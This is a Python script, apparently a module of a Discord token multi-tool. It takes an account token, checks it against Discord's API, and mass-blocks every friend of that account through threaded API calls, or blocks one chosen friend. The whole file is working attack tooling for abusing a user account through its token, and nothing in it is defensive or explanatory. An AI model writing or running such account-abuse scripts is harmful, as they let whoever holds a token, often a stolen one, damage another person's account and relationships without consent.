from Config.Util import *
from Config.Config import *
from Config.Translates import *

current_language = LANGUAGE

def tr(key):
    return translations[current_language].get(key, key)

try:
    import requests
    import threading
except Exception as e:
    ErrorModule(e)

Title("Discord Token Block Friends")

try:
    print()
    token = Choice1TokenDiscord()

    response = requests.get(
        'https://discord.com/api/v8/users/@me',
        headers={'Authorization': token, 'Content-Type': 'application/json'}
    )
    
    if response.status_code != 200:
        ErrorToken()

    def BlockFriends(token, friends):
        for friend in friends:
            try:
                response = requests.put(
                    f'https://discord.com/api/v9/users/@me/relationships/{friend["id"]}',
                    headers={'Authorization': token},
                    json={"type": 2}
                )
                print(f"\n{primary}[{secondary}{current_time_hour()}{primary}] {ADD} Status: {color.WHITE}{tr('Blocked')}{primary} | {tr('User')}: {color.WHITE}{friend['user']['username']}#{friend['user']['discriminator']}")
            except Exception as e:
                print(f"{invalid}[{secondary}{current_time_hour()}{invalid}] {ERROR} Status: {color.WHITE}{tr('Error')}: {e}{primary}")

    friends_list = requests.get(
        "https://discord.com/api/v9/users/@me/relationships",
        headers={'Authorization': token}
    ).json()

    if not friends_list:
        print(f"{INFO} {tr('NoFriends')}.")
        Continue()
        Reset()

    print(f"\n{secondary}[{primary}1{secondary}] {primary}{tr('BlockAll')}")
    print(f"{secondary}[{primary}2{secondary}] {primary}{tr('BlockOne')}")
    choice = input(f"\n{INPUT} {tr('Choice')} -> {reset}").strip()

    if choice == "1":
        processes = []
        for friend_batch in [friends_list[i:i+3] for i in range(0, len(friends_list), 3)]:
            t = threading.Thread(target=BlockFriends, args=(token, friend_batch))
            t.start()
            processes.append(t)
        
        for process in processes:
            process.join()

    elif choice == "2":
        print(f"\n{BEFORE + current_time_hour() + AFTER} {tr('FriendsList')} :\n")
        for idx, friend in enumerate(friends_list):
            username = friend['user']['username']
            discriminator = friend['user']['discriminator']
            print(f"{secondary}[{primary}{idx + 1}{secondary}] {primary} -> {secondary}{username}#{discriminator}")
        
        friend_choice = int(input(f"\n{INPUT} {tr('FriendsBlock')} -> ").strip()) - 1
        
        if 0 <= friend_choice < len(friends_list):
            selected_friend = [friends_list[friend_choice]]
            BlockFriends(token, selected_friend)
        else:
            ErrorNumber()
    else:
        ErrorChoice()

    Continue()
    Reset()

except Exception as e:
    Error(e)